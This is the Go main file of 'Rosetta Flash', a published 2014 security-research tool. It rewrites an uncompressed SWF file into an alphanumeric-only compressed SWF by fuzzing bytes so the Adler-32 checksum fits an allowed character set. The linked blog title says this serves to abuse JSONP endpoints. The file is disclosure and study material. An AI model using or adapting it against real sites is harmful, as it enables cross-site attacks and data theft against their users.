/*
 * Copyright 2014 Google Inc. All rights reserved.
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * -----------------------------------------------------------------
 * 
 * Rosetta Flash - a tool for manipulating SWF files.
 *
 * More info at:
 * https://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/
 *
 * Michele Spagnuolo - https://miki.it
 * 8 July 2014
 */

package main

import (
 	"errors"
	"flag"
	"fmt"
	"io/ioutil"

	"github.com/mikispag/rosettaflash/adler32_fuzzer"
	"github.com/mikispag/rosettaflash/adler32_mod"
	"github.com/mikispag/rosettaflash/charset"
	"github.com/mikispag/rosettaflash/flashFile"
	"github.com/mikispag/rosettaflash/utils"
	"github.com/mikispag/rosettaflash/zlibStream"
)

//var ALLOWED_CHARSET = []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._")
//var ALLOWED_CHARSET = []byte("abcdefghijklmnopqrstuvwxyz0123456789._")
var ALLOWED_CHARSET = []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
var SWFFile flashFile.FlashFile

func main() {
	Input := flag.String("input", "", "Uncompressed SWF as input file.")
	Output := flag.String("output", *Input+"-ascii.swf", "Filename for the output generated SWF.")
	flag.Parse()

	if len(*Input) == 0 || len(*Output) == 0 {
		fmt.Println("You have to specify an input file (--input) and an output file (--output).\n")
		fmt.Println("Example usage:")
		fmt.Println("./rosettaflash --input X.swf --output X-ascii.swf")
		return
	}

	allowed_charset := charset.New(ALLOWED_CHARSET)

	data, err := ioutil.ReadFile(*Input)
	utils.Panic(err)

	// Check if original SWF is uncompressed (FWS)
	if (data[0] != 'F') {
		utils.Panic(errors.New("Input SWF is not uncompressed (first bytes: FWS). Uncompress it and try again."))
	}

	body := data[8:]
	checksum := adler32_mod.Checksum(body)

	fmt.Printf("ADLER32 checksum of uncompressed data: %x\n", checksum)

	if adler32_mod.Checksum_allowed(checksum, allowed_charset) {
		fmt.Println("Checksum of original file allowed.")
	} else {
		fmt.Println("Checksum of original contains forbidden characters.")
		bytes_to_append := adler32_fuzzer.Get_appended_bytes(checksum, allowed_charset)
		body = append(body, bytes_to_append...)
		checksum = adler32_mod.Update(checksum, bytes_to_append)

		fmt.Printf("ADLER32 checksum %x is valid, appended %v bytes.\n", checksum, len(bytes_to_append))
	}

	if adler32_mod.Checksum_allowed(checksum, allowed_charset) {
		fmt.Println("Generating zlib stream.")
	} else {
		panic("Checksum still contains forbidden characters. Exiting.")
		return
	}

	// Initialize and write the zlib/DEFLATE stream
	stream := zlibStream.InitializeZlibStream()
	stream.Start(body, allowed_charset)

	// Wrap the stream
	stream.WriteFullByteStream(checksum)

	// Generate a zlib-compressed SWF file that satisfies the charset constraints
	SWFFile.WriteFile(stream)

	// Finally write the file on disk
	err = ioutil.WriteFile(*Output, SWFFile.GetBytes(), 0644)
	utils.Panic(err)
}
